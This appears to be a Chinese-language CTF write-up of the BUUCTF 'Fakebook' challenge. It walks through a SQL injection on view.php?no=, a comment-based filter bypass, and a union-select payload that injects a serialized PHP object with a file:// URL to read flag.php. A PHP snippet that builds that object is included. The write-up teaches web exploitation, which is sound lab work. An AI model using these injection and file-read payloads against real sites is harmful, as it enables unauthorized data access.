# T16 Fakebook

> 题目：BUUCTF [网鼎杯 2018]Fakebook

__0X00 审题__

打开是一个登陆页面，有进入和注册两个选项，先看进入，问我们用户名与密码，无论如何尝试回显都一样，然后注册一个用户

```
# 	username 	age 	blog
1	  admin	    111	 http://www.baidu.com
```

其中admin可以点开: the contents of his/her blog

这里需要注意一点，注点不在密码，也不在用户名上，注意观察url或者源码：

```
/view.php?no=1
```

这里有个no,验证其是否存在注点

```
no='
>>[*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1)
```

找到注入位置


__0x01 解题__

1. 寻找数据库，表，字段

> 大体写法与之前类似，有两个注意点

* 注1：如果通过联合注入查询会发现，union select 连用遭到了过滤（一直是no hack~），新的方法可以通过/**/绕过，或者/!SeLEct*/

* 注2：因为no是INT型的注意没有单引号引起，加上会一直判错

2. 最后找到表users中的data

得到：

```
O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:123;s:4:"blog";s:20:"http://www.baidu.com";}
```

_一个序列化的UsersInfo_

> 根据no=1的页面猜测，序列化的类和数据库表中的字段no，username，passwd，data顺序相似，第四个字段应该就是data，（可以进行测试，即将其放置4，观察回显）


3. 存在flag.php并猜测存在于/var/www/html，目标得到其内容

```
1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' from users#
```

4. 得到一串base64编码

```php
<?php
$flag = "flag{14a61955-43e7-431e-bdd8-6770f94c4002}";
exit(0);
```

__0x02 总结__

1. 关于注意事项与防过滤
2. 关于其他解法

* 其一：构造序列化后传参

```php
<?php
class UserInfo
{
    public $name = "1";
    public $age = 0;
    public $blog = "file:///var/www/html/flag.php";
}
 
$ganyu = new UserInfo();
echo serialize($ganyu);
?>
```

> [引用](https://blog.csdn.net/qq_58784379/article/details/120548225)[详情](https://blog.csdn.net/qq_44657899/article/details/104884553)

